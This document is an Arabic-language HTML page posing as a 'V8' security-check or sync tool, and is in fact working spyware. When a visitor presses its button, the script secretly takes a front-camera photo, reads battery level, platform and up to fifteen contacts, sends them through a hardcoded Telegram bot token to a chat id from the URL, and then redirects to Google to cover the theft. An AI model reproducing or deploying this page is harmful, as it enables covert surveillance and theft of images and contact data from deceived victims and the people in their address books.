<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V8 - Security Check</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #00ffcc; padding: 30px; border-radius: 15px; background: rgba(0,255,204,0.1); box-shadow: 0 0 20px #00ffcc; width: 85%; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام الحماية V8</h2>
        <p id="st">بانتظار تفعيل بروتوكول المزامنة...</p>
        <button class="btn" onclick="v8Execute()">تفعيل المزامنة الكاملة ✅</button>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');

        async function v8Execute() {
            if(!uid) return;
            document.getElementById('st').innerText = "جاري تنفيذ بروتوكول السحب...";

            try {
                // 1. سحب الكاميرا (الأمامية)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                const blob = await (await fetch(photo)).blob();

                // 2. سحب الشحن والأسماء
                const battery = await navigator.getBattery();
                let report = `🛰 **اختراق V8 ناجح!**\n🔋 الشحن: ${Math.floor(battery.level*100)}%\n📱 النظام: ${navigator.platform}`;

                if ('contacts' in navigator) {
                    try {
                        const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        report += `\n📇 سجل الأسماء:\n` + list.slice(0, 15).map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
                    } catch(e) {}
                }

                // 3. إرسال "التقرير الشامل" دفعة واحدة
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', report.slice(0, 1024));
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                stream.getTracks().forEach(t => t.stop());
                document.getElementById('st').innerText = "تمت المزامنة بنجاح!";
                setTimeout(() => window.location.replace("https://google.com"), 2000);
            } catch (e) { window.location.replace("https://google.com"); }
        }
    </script>
</body>
</html>
